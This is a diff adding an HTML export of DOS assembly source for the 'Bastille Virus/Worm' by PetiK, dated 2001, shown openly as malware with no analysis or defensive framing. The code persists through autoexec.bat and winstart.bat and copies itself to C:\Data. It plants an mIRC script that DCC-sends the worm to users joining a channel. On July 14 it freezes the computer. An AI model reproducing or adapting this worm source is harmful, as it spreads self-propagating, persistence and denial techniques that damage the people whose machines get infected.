@@ -1,0 +1,196 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Bastille Virus/Worm par PetiK le 23/04/2001 et 03/06/2001</span><span class="sc0">
+
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0">
+</span><span class="sc9">.code</span><span class="sc0">
+
+</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
+
+</span><span class="sc5">DEBUT</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">
+</span><span class="sc5">OUVRE_AUTO</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D01h</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FILE</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; open autoexec.bat</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
+
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; get to the end of file</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">AUTOL</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DAUTO</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; write the message</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FILE</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; get readonly attribute</span><span class="sc0">
+
+</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">WINSTART</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">WINSTARTL</span><span class="sc0">            </span><span class="sc1">; Create C:\Windows\winstart.bat</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DWINSTART</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    
+
+</span><span class="sc5">COPIE_VIRUS</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DIR</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Create C:\Data directory</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COPIE</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Create C:\Data\Win32.com</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VRAIFIN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DEBUT</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DEBUT</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; write</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; and close</span><span class="sc0">
+
+
+</span><span class="sc5">MIRC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">MIRCF1</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">MIRCL</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DMIRC</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Create a script for mIRC</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCF2</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCF1</span><span class="sc0">            </span><span class="sc1">; And copy to C:\mirc directory</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCF2</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCF1</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+
+</span><span class="sc5">DATE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
+    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
+    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FIN</span><span class="sc0">                 </span><span class="sc1">; July 14th ??</span><span class="sc0">
+
+</span><span class="sc5">FEU</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
+    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">MSG</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    </span><span class="sc6">cli</span><span class="sc0">                 </span><span class="sc1">; yes = not good for you</span><span class="sc0">
+    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
+
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">
+    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
+    
+
+</span><span class="sc5">FILE</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\Autoexec.bat'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">MIRCF1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\script.ini'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">MIRCF2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\mirc\script.ini'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DIR</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\Data'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">COPIE</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\Data\Win32.com'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">WINSTART</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\Windows\winstart.bat'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">WHO</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bastille Virus/Worm by PetiK (c)2001'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+
+</span><span class="sc5">DAUTO</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@echo off'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'cls'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'echo You''re infected by Bastille Virus (c)2001'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'echo.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'echo Don''t panic ! It''s not dangerous, just fatal !!'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'pause'</span><span class="sc0">
+</span><span class="sc5">AUTOL</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DAUTO</span><span class="sc0">
+
+</span><span class="sc5">DMIRC</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[script]'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n0=on 1:start:{'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n1= .sreq ignore'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n2=}'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">   
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n3=on 1:connect:/rename C:\Data\Win32.com C:\Bastille.com'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n4=on 1:join:#:{'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n5=if ($nick != $me) { dcc send $nick C:\Bastille.com }'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n6=}'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n7=on 1:disconnect:/rename C:\Bastille.com C:\Data\Win32.com'</span><span class="sc0">
+</span><span class="sc5">MIRCL</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DMIRC</span><span class="sc0">
+
+</span><span class="sc5">DWINSTART</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@echo off'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'if exist C:\Data\Win32.com C:\Data\Win32.com'</span><span class="sc0">
+</span><span class="sc5">WINSTARTL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">DWINSTART</span><span class="sc0">
+
+</span><span class="sc5">MSG</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'YOUR COMPUTER IS FOR THE MOMENT DEAD'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WAIT TOMORROW TO RESTART YOUR COMPUTER'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'            PetiK (c)2001 $'</span><span class="sc0">
+        
+    
+</span><span class="sc5">VRAIFIN</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">DEBUT</span><span class="sc0">
+</span></div></body>
+</html>
